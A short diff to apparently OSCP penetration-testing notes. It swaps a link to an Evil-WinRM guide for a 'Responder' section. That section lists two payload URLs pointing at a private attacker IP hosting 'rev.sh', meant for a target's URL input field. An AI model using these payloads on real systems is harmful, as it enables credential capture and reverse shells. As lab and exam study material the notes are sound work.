@@ -7,10 +7,11 @@ OSCP
 - winPEAS
 
 
-
-
-## Article
-https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
+## Responder: when there's a url input section 
+```bash
+http://192.168.45.176/share/rev.sh
+file://192.168.45.176/test/rev.sh
+```
 
 
 ## Shells & stuff
